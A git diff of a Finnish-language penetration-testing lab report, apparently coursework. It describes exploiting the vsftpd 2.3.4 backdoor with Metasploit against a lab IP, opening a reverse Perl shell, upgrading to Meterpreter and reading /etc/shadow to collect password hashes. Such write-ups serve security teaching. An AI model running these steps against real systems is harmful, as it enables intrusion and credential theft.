@@ -57,9 +57,9 @@ Metasploit DB: Tallentaa tiedot PostgreSQL-tietokantaan.
 
 Käytin hyökkäykseen moduulia exploit/unix/ftp/vsftpd_234_backdoor
 
-- 1. set RHOSTS 192.168.18.128
+- 1 . set RHOSTS 192.168.18.128
 
-- 2. exploit
+- 2 . exploit
  
 <img width="1262" height="410" alt="show options" src="https://github.com/user-attachments/assets/e963c28d-17aa-489f-a66f-b35e3cd839c7" />
 
@@ -102,3 +102,13 @@ Syy oli se, että minulla ei ollut payloadia valittu, joten kävin katsomassa mi
 
 Asetin payloadiksi cmd/unix/reverse_perl ja määrittelin LHOST (oma IP). Tämä avasi toisen istunnon kohteeseen
 
+
+## i) Meterpretrin ominaisuudet
+
+Päivitin perusyhteyden Meterpreter-sessioon (shell_to_meterpreter). Meterpretrillä demonstroin:
+
+- sysinfo: Järjestelmän tiedot.
+
+- getuid: Vahvisti root-oikeudet.
+
+- hashdump: Yritin tiivisteiden ajoa, mutta Linux-ympäristössä hyödynsin manuaalista /etc/shadow-lukua tiedon keräämiseen.
